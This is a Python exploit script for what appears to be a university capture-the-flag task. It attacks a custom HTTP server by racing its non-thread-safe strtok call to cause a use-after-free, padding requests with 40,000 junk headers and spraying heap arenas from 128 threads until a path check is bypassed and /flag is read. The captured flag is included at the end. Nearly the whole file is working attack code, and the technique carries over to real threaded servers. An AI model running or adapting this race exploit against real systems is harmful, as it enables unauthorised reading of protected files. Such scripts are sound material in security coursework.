#!/usr/bin/env python3

import pwn
import threading
import sys
import socket

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up
# 2) docker exec -ti "$(docker ps -q -f 'ancestor=softsec/httpd')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

#port = 1024
port = 33055

#host = "127.0.0.1"
host = "tasks.ws24.softsec.rub.de"

# General attack ideea:
# strtok is used, which is not thread safe
# we need the following thing to happen:
#   t1: strtok(b'GET /ignore_me HTTP/1.0')
#       => now strtok internally stores pointer to /ingore_me HTTP/1.0
#   attacker_thread_A: strtok(b'GET /allow HTTP/1.0\r\n\r\n')
#       => now strtok internally stores pointer to /allow HTTP/1.0
#   t1: strtok(NULL) returns /allow and checks pass :)
#   attacker_thread_A: strtok(NULL) returns NULL and error => free()'s string b'GET /allow HTTP/1.0\r\n\r\n'
#   attacker_thread_B: now store b'GET //flag HTTP/1.0\r\n' in same memory location (t1 still points there and now to /flag)
#   t1: now accesses the file and prints /flag


# this just gets a file from the server and prints flag if there is one
def get_file(payload):
    while(True):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((host, port))
                client_socket.sendall(payload)
                potential_flag = client_socket.recv(1000, socket.MSG_WAITALL)
                if b'softsec' in potential_flag:
                    print(potential_flag)
                    break
        except:
            pass


# send a path that passes the checks
def attacker_thread_A():
    while(True):
        # first set path to a valid one that passes all tests
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((host, port))
            client_socket.sendall(b'GET /allow HTTP/1.0\r\n\r\n')
            client_socket.recv(1000, socket.MSG_WAITALL)
        # then connection is terminated (error in strtok) and path is free'd

  
# send a path that reads the flag
def attacker_thread_B():
    while(True):
        # now we create a new connection and hopefully get same heap chunk (main thread still points into this memory region) to write /flag into it
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((host, port))
            # do not send last "\r\n" to keep thread on server longer open => occupy the tread arena
            client_socket.sendall(b'GET //flag HTTP/1.0\r\n')


# add junk headers to slow down process
payload = b'GET /ignore_me HTTP/1.0\r\n'
for _ in range(40000):
    payload += b"Junk-Header: ignore_me\r\n"
payload += b'\r\n'

# t1 is the thread that eventually reads the flag
t1 = threading.Thread(target=get_file, args={payload})
t1.start()

for _ in range(1):
    t = threading.Thread(target=attacker_thread_A)
    t.start()

# problem: there are 128-256 many arenas and thread gets random one, so we spawn 128 many to have one hit
for _ in range(128):
    t = threading.Thread(target=attacker_thread_B)
    t.start()

t1.join()
sys.exit()

#softsec{gnq9iGB74ygM15P5Et3cwJdJa82dLnXAGSJuu5HLB7JyYqKWIP-h9Xg7X_p8yEUg}